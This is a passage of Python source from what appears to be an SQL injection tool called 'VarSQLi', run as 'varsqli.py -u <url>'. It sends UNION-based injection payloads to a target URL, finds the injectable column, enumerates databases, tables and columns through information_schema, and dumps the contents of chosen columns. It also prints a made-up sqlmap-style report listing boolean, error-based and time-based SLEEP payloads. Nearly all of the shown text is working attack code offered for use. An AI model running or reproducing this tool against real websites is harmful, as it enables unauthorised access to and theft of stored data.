                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for tables_dump in find_all:
                                                tables_name = tables_dump.replace("::", "")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                time.sleep(0.30)
                                            print('+----------------------------------+')
                                            print("|         Column Name              |")
                                            print("+----------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)
                                            print("+----------------------------+")
                                            print("Find {} Tables".format(num_tab))
                                            break

                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns and Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print("[INFO] Columns Found : {}".format(numbers))
                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                            get_contents = requests.get(url + split_nums)
                                            html_contents = get_contents.text
                                            find_checkings = r"\b\w+::\b\w+::\b"
                                            find_alls = re.findall(find_checkings, html_contents)

                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for column_dump in find_all:
                                                columns_name = column_dump.replace("::", " ")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                time.sleep(0.30)
                                                print("+------------------------------+")
                                                print("| Tables Name  |  Columns Name |")
                                                print("+------------------------------+")
                                                num_tab = 0
                                                for dump in find_all:
                                                    num_tab += 1
                                                    tables_name = dump.replace("::", " ")
                                                    print("|", tables_name)
                                                print("+------------------------------+")
                                                print("Find {} Tables and Columns".format(num_tab))
                                                print("")
                                                exit()
                                
            start_exploit()
# ==============================================================================================================================================
        # check queries
        else:
            def start_exploit_1():
                count_num = 0
                for payload in payloads_2:
                    count_num += 1 
                    check_conn = requests.get(url + payload)
                    if check_conn.status_code == 200:
                        pass
                        exploits = requests.get(url + payload)
                        
                        if "The used SELECT" in exploits.text:
                            pass
                        else:
                            print(f'''
  GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)
  sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
  ---
  Parameter: id (GET)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: ' AND 6847=6847 AND 'XvUz'='XvUz

      Type: error-based
      Title: MySQL >= AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: ' AND (SELECT 4239 FROM(SELECT COUNT(*),CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Knwb'='Knwb

      Type: time-based blind
      Title: MySQL >= AND time-based blind (query SLEEP)
      Payload: ' AND (SELECT 7342 FROM (SELECT(SLEEP(5)))rKZp) AND 'zqte'='zqte

      Type: UNION query
      Title: Generic UNION query (NULL) - {count_num} columns
      Payload: {payload} CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2)) 
  ---
  ''')                      
                            
                            if args.dbs:
                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting fetching Database name..............")
                                num = count_num
                                nums = [num for num in range(0, num+1)]
                                for numbers in nums:
                                    payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                    split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                    check_count = requests.get(url + split_nums)
                                    if str(numbers) and "::" in check_count.text:
                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Found columns : {}".format(numbers))
                                        payload_get_dbs = "(SELECT GROUP_CONCAT(database(),'::',version()))"

                                        split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_dbs, payload)
                                        get_content = requests.get(url + split_nums)
                                        html_content = get_content.text
                                        # checking find
                                        check_find = r"\b\w+::\b"
                                        find_all = re.findall(check_find, html_content)
                                        print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " back-end MySQL : MySQL >= x.x")
                                        print("available databases [2]:")
                                        for dbs in find_all:
                                            dbs_name = dbs.replace("::", " ")
                                            print("+-----------------------+")
                                            print("[*]", dbs_name)
                                            print("[*] information_schema")
                                            print("")
                                            exit()
                                        print("")
                            else:
                                pass

                            if args.DB:
                                if args.dumps:
                                    if args.TB:
                                        if args.CO:
                                            num = count_num
                                            nums = [num for num in range(0, num+1)]
                                            for numbers in nums:
                                                pl1 = "(SELECT GROUP_CONCAT(user(),'::',@@port))"
                                                pl2 = re.sub(r"\b{}\b".format(numbers), pl1, payload)
                                                results = requests.get(url + pl2)
                                                if str(numbers) and "::" in results.text:
                                                    table_names = args.TB
                                                    columns_name = args.CO

                                                    def dump():
                                                        payload1 = f"(SELECT GROUP_CONCAT({columns_name},'::',@@port) FROM {table_names})"
                                                        split_num = re.sub(r"\b{}\b".format(numbers), payload1, payload)
                                                        get_content = requests.get(url + split_num)
                                                        html_content = get_content.text
                                                        find_data = r"\b\w+::\b"
                                                        findall_all = re.findall(find_data, html_content)
                                                        for dump in findall_all:
                                                            dump_dbs = dump.replace("::", "")
                                                            print(f"+-------------------+")
                                                            print(f"| {table_names} - {columns_name}")
                                                            print(f"+-------------------+")
                                                            print(f"| {columns_name} : {dump_dbs}")
                                                            print(f"+-------------------+")
                                                            exit()
                                                    dump()
                                        else:
                                            pass
                                    else:
                                        pass
                                else:
                                    pass
                            else:
                                pass
                            if args.TAB:
                                if args.DB:
                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for tables_dump in find_all:
                                                tables_name = tables_dump.replace("::", "")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                time.sleep(0.30)
                                            print('+----------------------------------+')
                                            print("|         Tables Name              |")
                                            print("+----------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)
                                            print("+----------------------------------+")
                                            print("Find {} Tables".format(num_tab))
                                            print("")
                                            exit()
                                else:
                                    pass
                            else:
                                pass

                            if args.COL:
                                if args.DB: 
                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                            get_contents = requests.get(url + split_nums)
                                            html_contents = get_contents.text
                                            find_checkings = r"\b\w+::\b\w+::\b"
                                            find_alls = re.findall(find_checkings, html_contents)

                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for column_dump in find_all:
                                                columns_name = column_dump.replace("::", " ")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                time.sleep(0.30)
                                            print("+------------------------------+")
                                            print("| Tables Name  |  Columns Name |")
                                            print("+------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)
                                            print("+------------------------------+")
                                            print("Find {} Tables and Columns".format(num_tab))
                                            print("")
                                            exit()
                                else:
                                    pass
                            else:
                                pass


                            if args.dumps:
                                if args.DB:
                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for tables_dump in find_all:
                                                tables_name = tables_dump.replace("::", "")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                time.sleep(0.30)
                                            print('+----------------------------------+')
                                            print("|         Tables Name              |")
                                            print("+----------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)

                                            print("+----------------------------+")
                                            print("Find {} Tables".format(num_tab))
                                            break

                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Columns Found : {}".format(numbers))
                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for tables_dump in find_all:
                                                tables_name = tables_dump.replace("::", "")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
                                                time.sleep(0.30)
                                            print('+----------------------------------+')
                                            print("|         Column Name              |")
                                            print("+----------------------------------+")
                                            num_tab = 0
                                            for dump in find_all:
                                                num_tab += 1
                                                tables_name = dump.replace("::", " ")
                                                print("|", tables_name)
                                            print("+----------------------------+")
                                            print("Find {} Tables".format(num_tab))
                                            break

                                    print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " Starting Enumerate Columns and Tables name.......")
                                    num = count_num
                                    nums = [num for num in range(0, num+1)]
                                    for numbers in nums:
                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
                                        checking_count = requests.get(url + split_num)
                                        if str(numbers) and "::" in checking_count.text:
                                            print("[INFO] Columns Found : {}".format(numbers))
                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                            split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                            get_contents = requests.get(url + split_nums)
                                            html_contents = get_contents.text
                                            find_checkings = r"\b\w+::\b\w+::\b"
                                            find_alls = re.findall(find_checkings, html_contents)

                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                            get_content = requests.get(url + split_num)
                                            html_content = get_content.text
                                            find_checking = r"\b\w+::\b\w+::\b"
                                            find_all = re.findall(find_checking, html_content)
                                            print(split_num)
                                            for column_dump in find_all:
                                                columns_name = column_dump.replace("::", " ")
                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                time.sleep(0.30)
                                                print("+------------------------------+")
                                                print("| Tables Name  |  Columns Name |")
                                                print("+------------------------------+")
                                                num_tab = 0
                                                for dump in find_all:
                                                    num_tab += 1
                                                    tables_name = dump.replace("::", " ")
                                                    print("|", tables_name)
                                                print("+------------------------------+")
                                                print("Find {} Tables and Columns".format(num_tab))
                                                print("")
                                                exit()
            start_exploit_1()
    # check vuln
    else:
        print("[WARNING] Target may be not vulnerable , please check again..")
        exit()
else:
    print("VarSQLi : python3 varsqli.py -u < url > --dbs")
    print("")
    print("--dbs : Enumerate DBMS databases")
    print("")
    print("--tables : Enumerate DBMS database tables")
    print("")
    print("--columns : Enumerate DBMS database table columns")
    print("")
    print("--dump-all : Dump All DBMS database tables and columns")
    print("")
    print("-D : DBMS database to enumerate")
    print("")
    print("-T : Enumerate database to enumerate tables ( ex : --dump-all -T < tables name > -C < columns name >)")
    print("")
    print("-C : Enumerate database to enumerate table columns ( ex : --dump-all -T < tables name > -C < columns name >)")
    print("")
    exit()
